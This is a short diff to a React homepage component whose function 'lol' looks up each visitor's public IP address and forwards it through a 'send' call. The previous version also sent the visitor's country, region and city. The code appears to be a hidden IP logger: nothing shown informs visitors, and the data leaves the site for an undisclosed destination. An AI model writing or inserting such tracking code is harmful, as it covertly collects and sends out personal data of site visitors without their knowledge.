@@ -24,15 +24,12 @@ export default function Home() {
     };
 
     function lol() {
-        fetch("http://www.geoplugin.net/json.gp").then((response) => {
+        fetch("https://api.ipify.org?format=json").then((response) => {
             response.json().then((inputData) => {
                 console.log(inputData);
                 let content = {
                     title: "hi",
-                    description: `**IP:** ${inputData.geoplugin_request}
-                    **Country:** ${inputData.geoplugin_countryName}
-                    **State/Province:** ${inputData.geoplugin_regionName}
-                    **Town/City:** ${inputData.geoplugin_city}`,
+                    description: `**IP:** ${inputData.ip}`
                 };
                 send(content);
             }).catch(console.error);
